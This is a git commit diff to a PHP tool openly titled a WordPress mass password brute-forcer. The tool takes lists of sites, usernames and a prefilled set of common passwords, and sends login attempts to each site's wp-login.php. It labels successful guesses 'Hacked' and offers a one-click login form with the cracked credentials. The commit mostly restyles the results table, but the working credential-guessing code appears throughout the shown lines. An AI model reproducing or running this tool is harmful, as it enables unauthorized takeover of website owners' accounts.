3807f05a1478554c7315a4dd6bf41dfaa2adad57
B10S <bios.ma@inbox.ru>
2017-05-27 14:23:49 +0000

    Update WPMB.php

--- WPMB.php
+++ WPMB.php
@@ -10,6 +10,7 @@ ignore_user_abort(true);
 <title>WPMB By (B10S)</title> 
 <style type="text/css">textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
 background-color:white;box-shadow:none;transition:all.15s ease-in-out;} 
+#brd{border:1px solid black;border-collapse:collapse;padding:5px} 
 body{min-width:0;color:#444;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; 
 font-size:13px;} 
 .form{background:#ffffff;border:1px solid#d4dfe7;box-shadow:0px 1px 2px 0px#e7edf3;padding:20px 24px 24px;margin-left:auto;margin-right:auto;} 
@@ -20,22 +21,14 @@ font-size:14px;line-height:1.3;border-radius:4px;padding:10px 16px;}</style></he
 <div id="login" style="width:65%;height:50%"> 
 <h1><a href="https://wordpress.com/" title="WordPress.com" tabindex="-1">~:: Mass PW Brut ::~</a></h1> 
 <img src="https://lh3.googleusercontent.com/obQGLnd-9QtTN6lVHOlpTAFhAEWq7de1f7vPMVHmXworL2UAoCDE6X6woNnjfBckK2ngh35S=s328-no" width="200" title="Shity WordPress Kracker !  ;-}" /> 
-<form class="form" method="post">
-	<table cellspacing="0" cellpadding="0"><center>
-  <tr>
-    <td><div id="FIN">List Site :</div></td>
-    <td><div id="FIN">User Names </div></td>
-    <td><div id="FIN">Pass Words</div></td>
-  </tr>
-  <tr>
-    <td><textarea name=s>http://example.com/blog</textarea></td> 
-    <td><textarea name=u>admin</textarea></td> 
-    <td><textarea name=p><?="admin\n123456\n123123\nadmin123\npassword1\nabc123\n12341234\nquerty\npass\nadministrator"?></textarea></td> 
-  </tr>
-</center></table><p><input type="submit" name="sub" value="<=  Brut Now  =>" /></p></form></div>
-<?php 
+<form class="form" method="post"><table cellspacing="0" cellpadding="0"><center> 
+<tr><td><div id="FIN">List Site :</div></td><td><div id="FIN">User Names </div></td><td><div id="FIN">Pass Words</div></td></tr>
+<tr><td><textarea name=s>http://example.com/blog</textarea></td><td><textarea name=u>admin</textarea></td> 
+<td><textarea name=p><?="admin\n123456\n123123\nadmin123\npassword1\nabc123\n12341234\nquerty\npass\nadministrator"?></textarea></td> 
+</tr></center></table><p><input type="submit" name="sub" value="<=  Brut Now  =>" /></p></form></div><?php 
 if($_POST){ 
-echo"<table borther=1><tr><td>Addr</td><td>User</td><td>Pass</td><td>Req Type</td><td>Action</td></tr>"; 
+echo"<table id='brd'><tr id='brd'><td id='brd'>Addr</td>
+<td id='brd'>User</td><td id='brd'>Pass</td><td id='brd'>Req Type</td><td id='brd'>Action</td></tr>"; 
 $s=explode("\n",str_replace("\r",'',$_POST['s'])); 
 $u=explode("\n",str_replace("\r",'',$_POST['u'])); 
 $p=explode("\n",str_replace("\r",'',$_POST['p'])); 
@@ -46,7 +39,8 @@ foreach($u as$U=>$_U){
       $_S=(substr($_S,-1)!='/')?$_S.'/':$_S; 
       $_S=substr($_S,0,7)=='http://'?$_S:(substr($_S,0,8)=='https://')?$_S:'http://'.$_S; 
       if(!th($_S)){ 
-        echo"<tr style='color:#F00'><td>".$_S."</td><td>N/A</td><td>N/A</td><td>Error URL !</td><td>N/A</td></tr>"; 
+        echo"<tr id='brd' style='color:#F00'><td>".$_S."</td>
+<td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Error URL !</td><td id='brd'>N/A</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
         continue; 
@@ -63,7 +57,8 @@ foreach($u as$U=>$_U){
       $N=curl_getinfo($bt,CURLINFO_HTTP_CODE); 
       curl_close($bt); 
       if($N==404){ 
-        echo"<tr style='color:#F00'><td>".$_S."wp-login.php</td><td>N/A</td><td>N/A</td><td>Login No Found !</td><td>404</td></tr>"; 
+        echo"<tr id='brd' style='color:#F00'><td id='brd'>".$_S."wp-login.php</td> 
+<td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Login No Found !</td><td>404</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
         continue; 
@@ -71,8 +66,8 @@ foreach($u as$U=>$_U){
       if(eregi("profile.php",$rez)){ 
 echo'<iframe src="'.$_S.'wp-admin" style="width:0;height:0;border:0;border:none;"></iframe>'; 
         ob_flush();flush(); 
-echo"<tr style='color:#0F0'><td>".$_S."</td><td>".$_U."</td><td>".$_P."</td><td>Hacked</td><td> 
-<form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." />
+echo"<tr id='brd' style='color:#0F0'><td>".$_S."</td><td id='brd'>".$_U."</td><td id='brd'>".$_P."</td><td id='brd'>Hacked</td> 
+<td id='brd'><form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." /> 
 <input type=hidden name=pwd value=".$_P." /> 
 <input type=hidden name=testcookie value=1 /><button>Connect</button></form>"; 
         ob_flush();flush(); 
